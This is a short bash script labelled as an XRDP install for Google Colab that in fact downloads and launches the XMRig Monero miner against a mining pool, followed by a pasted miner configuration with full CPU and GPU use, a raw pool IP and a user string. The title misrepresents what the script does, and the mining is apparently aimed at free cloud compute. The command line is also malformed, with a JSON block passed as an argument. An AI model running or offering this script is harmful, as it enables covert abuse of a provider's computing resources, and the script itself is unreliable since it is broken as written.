#! /bin/bash
# Install XRDP
# Before get xmr coin for free
# Google Colab
sudo apt update
clear
sudo apt install screen
screen -R xmr
 
wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-bionic-x64.tar.gz
tar xvzf xmrig-6.16.4-bionic-x64.tar.gz
cd xmrig-6.16.4
./xmrig -o us-west.minexmr.com:443 -u {
    "autosave": true,
    "donate-level": 1,
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "asm": true,
        "max-threads-hint": 100,
        "max-cpu-usage": 100,
        "yield": false,
        "init": -1,
        "*": {
            "intensity": 2,
            "threads": 8,
            "affinity": -1
        }
    },
    "opencl": true,
    "cuda": true,
    "pools": [
        {
            "coin": "monero",
            "algo": "cn/gpu",
            "url": "168.235.86.33:3393",
            "user": "SK_QzApkbVGsAxyQykaWSnEF.Carteu",
            "pass": "x",
            "tls": false,
            "keepalive": true,
            "nicehash": false
        }
    ]
}
